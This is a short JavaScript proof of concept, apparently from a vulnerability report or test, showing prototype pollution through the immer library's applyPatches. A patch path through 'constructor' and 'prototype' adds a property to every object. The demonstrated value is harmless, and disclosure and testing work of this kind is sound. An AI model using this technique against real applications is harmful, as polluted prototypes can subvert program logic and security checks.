console.log({}.polluted);
const {applyPatches, enablePatches} = require('immer');
enablePatches();
applyPatches({}, [{
        op: 'add',
        path: [
            'constructor',
            'prototype',
            'polluted'
        ],
        value: 'yes'
    }]);
console.log({}.polluted);